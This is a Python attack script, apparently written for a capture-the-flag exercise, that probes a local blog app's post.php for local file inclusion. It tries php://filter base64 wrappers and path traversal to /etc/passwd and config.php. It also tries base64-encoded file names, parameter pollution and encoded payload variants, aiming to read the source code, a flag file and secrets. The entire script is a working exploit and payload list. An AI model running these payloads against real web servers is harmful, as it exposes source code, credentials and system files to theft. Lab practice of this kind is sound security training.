import requests
import base64
import urllib.parse
import re

BASE_URL = "http://127.0.0.1:33209"

print("=" * 80)
print("Target: Encoder64 Blog - Advanced LFI Bypass Testing")
print("=" * 80)

# Try to get post.php source first with various techniques
print("\n[*] Attempting to retrieve post.php source code via LFI")
print("-" * 80)

# Since post.php uses file_exists(), let's try to use the same vulnerability
# to read its own source code
wrapper_payloads = [
    "php://filter/convert.base64-encode/resource=./post.php",
    "php://filter/read=convert.base64-encode/resource=./post.php",
    "php://filter/convert.base64-encode/resource=post.php",
    "php://filter/convert.base64-encode/resource=../post.php",
    "php://filter/convert.base64-encode/resource=../../post.php",
    "php://filter/convert.base64-encode/resource=../../../post.php",
    "php://filter/convert.base64-encode/resource=../../../../var/www/html/post.php",
]

print("\n[TEST 1] php://filter wrapper variations")
for i, payload in enumerate(wrapper_payloads):
    print(f"\n[*] Testing wrapper {i+1}: {payload[:50]}...")
    for param in ["id", "page", "file", "article"]:
        try:
            url = f"{BASE_URL}/post.php?{param}={payload}"
            resp = requests.get(url, timeout=10)
            print(f"  Parameter '{param}': Status={resp.status_code}, Length={len(resp.content)}B")
            
            # Check if we got base64 encoded content
            if len(resp.content) > 100 and resp.text.count('\n') < 5:
                try:
                    decoded = base64.b64decode(resp.text.strip()).decode('utf-8', errors='ignore')
                    print(f"  [!] SUCCESS! Decoded source content:")
                    print(f"  {decoded[:500]}")
                    
                    # Look for base64_decode usage
                    if "base64_decode" in decoded:
                        print(f"  [!] Found base64_decode() in source!")
                        
                        # Extract the parameter processing logic
                        lines = decoded.split('\n')
                        for line_num, line in enumerate(lines, 1):
                            if "base64_decode" in line or "$_GET" in line or "$_REQUEST" in line:
                                print(f"  Line {line_num}: {line.strip()}")
                    break
                except:
                    pass
        except Exception as e:
            print(f"  Error: {e}")

# Test Base64 encoding variations since this is "Encoder64 Blog"
print("\n\n[TEST 2] Base64 encoding variations")
print("-" * 80)

test_files = [
    "./post.php",
    "post.php",
    "../post.php",
    "flag.txt",
    "flag",
    "secret.txt",
    "config.php",
    "../config.php",
    "../../config.php",
    "/etc/passwd"
]

for test_file in test_files[:3]:  # Just test post.php retrieval for now
    print(f"\n[*] Testing file: {test_file}")
    
    # Standard Base64
    b64_standard = base64.b64encode(test_file.encode()).decode()
    print(f"  Standard Base64: {b64_standard}")
    
    # URL-safe Base64 (replace + with -, / with _)
    b64_urlsafe = base64.urlsafe_b64encode(test_file.encode()).decode()
    print(f"  URL-safe Base64: {b64_urlsafe}")
    
    # Without padding
    b64_nopad = b64_standard.rstrip('=')
    print(f"  Without padding: {b64_nopad}")
    
    # Try each encoding
    for variant_name, variant in [("standard", b64_standard), ("urlsafe", b64_urlsafe), ("nopad", b64_nopad)]:
        try:
            url = f"{BASE_URL}/post.php?id={variant}"
            resp = requests.get(url, timeout=10)
            print(f"    {variant_name}: Status={resp.status_code}, Length={len(resp.content)}B")
            
            if len(resp.content) > 50 and "Post not found" not in resp.text:
                if resp.text.count('\n') < 5:
                    try:
                        decoded = base64.b64decode(resp.text.strip()).decode('utf-8', errors='ignore')
                        print(f"    [!] Contains base64 data!")
                    except:
                        pass
                print(f"    Content: {resp.text[:200]}")
        except Exception as e:
            print(f"    Error: {e}")

# Test parameter pollution
print("\n\n[TEST 3] Parameter pollution (multiple same parameters)")
print("-" * 80)

pollution_tests = [
    ("id=post.php&id=./post.php", "Duplicate params"),
    ("id=../post.php&page=./post.php", "Different params same file"),
    ("id=php://filter/convert.base64-encode/resource=./post.php&id=test", "Wrapper + plain"),
]

for payload, desc in pollution_tests:
    print(f"\n[*] {desc}")
    try:
        url = f"{BASE_URL}/post.php?{payload}"
        resp = requests.get(url, timeout=10)
        print(f"  Status: {resp.status_code}, Length: {len(resp.content)}B")
        if len(resp.content) > 100:
            print(f"  Content: {resp.text[:200]}")
    except Exception as e:
        print(f"  Error: {e}")

# Test various encoding combinations for the wrapper
print("\n\n[TEST 4] Encoded wrapper payloads")
print("-" * 80)

wrapper = "php://filter/convert.base64-encode/resource=./post.php"
encoding_tests = [
    ("Plain", wrapper),
    ("Base64", base64.b64encode(wrapper.encode()).decode()),
    ("URL-safe Base64", base64.urlsafe_b64encode(wrapper.encode()).decode()),
    ("URL-encoded", urllib.parse.quote(wrapper)),
    ("Base64+URL", urllib.parse.quote(base64.b64encode(wrapper.encode()).decode())),
]

for enc_name, enc_payload in encoding_tests:
    print(f"\n[*] {enc_name}")
    try:
        url = f"{BASE_URL}/post.php?id={enc_payload}"
        resp = requests.get(url, timeout=10)
        print(f"  Status: {resp.status_code}, Length: {len(resp.content)}B")
        
        if len(resp.content) > 100:
            if resp.text.count('\n') < 5:
                try:
                    decoded = base64.b64decode(resp.text.strip()).decode('utf-8', errors='ignore')
                    print(f"  [!] Successfully decoded!")
                    print(f"  Content: {decoded[:500]}")
                except:
                    print(f"  Content: {resp.text[:200]}")
            else:
                print(f"  Content: {resp.text[:200]}")
    except Exception as e:
        print(f"  Error: {e}")

# Test if maybe we need to use a different extension
print("\n\n[TEST 5] Testing alternative file paths")
print("-" * 80)

alt_files = [
    "./post.php",
    "post.php.txt",
    "post.txt",
    "../post.php",
    "../../post.php",
    "../../../post.php",
    "../../../../var/www/html/post.php",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
]

for alt_file in alt_files:
    try:
        b64_file = base64.b64encode(alt_file.encode()).decode()
        url = f"{BASE_URL}/post.php?id={b64_file}"
        resp = requests.get(url, timeout=10)
        print(f"[*] {alt_file}: Status={resp.status_code}, Length={len(resp.content)}B")
        
        if len(resp.content) > 50 and "Post not found" not in resp.text:
            print(f"  Content: {resp.text[:200]}")
    except Exception as e:
        print(f"Error: {e}")

print("\n" + "=" * 80)
print("Testing complete - Review results above")
print("=" * 80)
